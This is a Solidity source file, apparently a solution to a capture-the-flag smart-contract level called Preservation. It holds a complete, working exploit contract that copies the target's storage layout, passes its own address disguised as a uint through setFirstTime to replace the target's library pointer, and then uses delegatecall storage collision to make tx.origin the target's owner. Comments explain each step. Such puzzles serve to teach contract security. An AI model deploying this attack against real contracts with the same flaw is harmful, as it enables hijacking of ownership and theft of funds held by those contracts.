pragma solidity ^0.8.0;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttack {

  // Variables of the Preservation contract
  address public timeZone1Library;  // slot 0
  address public timeZone2Library;  // slot 1
  address public owner;             // slot 2
  uint storedTime;                  // slot 3

  // Variables to perform the attack!
  IPreservation preservationContract;

  constructor(address _preservationContract) {
    preservationContract = IPreservation(_preservationContract);
  }

  // Even though the next function is called setTime(), its only functionality will be to update the owner variable of the Preservation contract
  // Since the Preservation contract uses a delegateCall() to execute the below function:
    // Any changes made to the storage during the execution of this function will be reflected on the Preservation contract's storage
        // Remember, delegateCall() uses the logic of the called contract but preserving the contract's context of the caller contract (context refers to the storage, balances, and some special variables)
  function setTime(uint _time) public {
    owner = tx.origin;
  }

  /**
   * @dev - changeLibraryAddress() will generate the malicious uint hidding the address of this contract and will call the setFirstTime() of the Preservation contract
   * @dev - After the setFirstTime() is executed, the timeZone1Library variable should've been updated for the address of this contract!
   */
  function changeLibraryAddress() public {
    uint addressMaskedAsUint = maskAttackerContract();
    preservationContract.setFirstTime(addressMaskedAsUint);
  }

  /**
   * @dev - maskAttackerContract() will returnthe address of this contract wrapped and masked as a uint
   * @return - The returned value will be zero-padded at the left, and the 20 bytes representing the address will be at the right!
   * The below diagram expresses bytes (each X or 0 is 8 bits!)
      * 00000000 0000XXXX XXXXXXXX XXXXXXXX
   * When the above uint is stored in the address variable (a bytes20), the most-left 12 bytes will be discarted, and only the most-right 20bytes will be stored!
   */
  function maskAttackerContract() internal view returns (uint) {
    return uint(uint160(address(this)));
  }

}